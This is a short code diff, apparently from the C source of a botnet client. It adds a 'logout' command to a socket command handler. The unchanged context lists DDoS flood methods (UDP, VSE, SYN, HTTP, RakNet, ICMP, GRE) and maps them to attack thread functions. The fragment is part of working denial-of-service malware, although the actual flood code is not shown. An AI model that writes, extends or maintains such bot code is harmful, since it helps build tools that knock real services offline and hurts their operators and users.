@@ -214,6 +214,13 @@ void handle_command(char* command, int sock) {
         return;
     }
     
+    if (strcmp(command, "logout") == 0) {
+        cleanup_attack_threads();
+        shutdown(sock, SHUT_RDWR);
+        close(sock);
+        exit(0);
+    }
+    
     static const char *methods[] = {"!udp", "!vse", "!syn", "!socket", "!http", "!raknet", "!icmp", "!gre"};
     static const int method_len[] = {4, 4, 4, 7, 5, 7, 5, 4};
     static void* (*attack_funcs[])(void*) = {
